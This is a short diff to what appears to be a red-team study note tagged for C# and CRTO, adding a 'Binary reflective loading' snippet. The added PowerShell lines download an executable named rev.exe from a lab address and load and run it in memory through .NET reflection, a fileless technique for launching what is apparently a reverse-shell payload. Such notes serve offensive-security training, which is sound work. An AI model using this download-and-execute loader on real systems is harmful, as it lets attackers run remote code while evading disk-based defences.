@@ -9,3 +9,11 @@ tags: [C# CRTO REDTEAMING]
 [system.reflection.assembly]::LoadFile("file")
  [namespace.class]::Main()
 ```
+
+Binary reflective loading
+
+```csharp
+$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/rev.exe')
+$assem = [System.Reflection.Assembly]::Load($data)
+[rev.Program]::Main("".Split())
+```
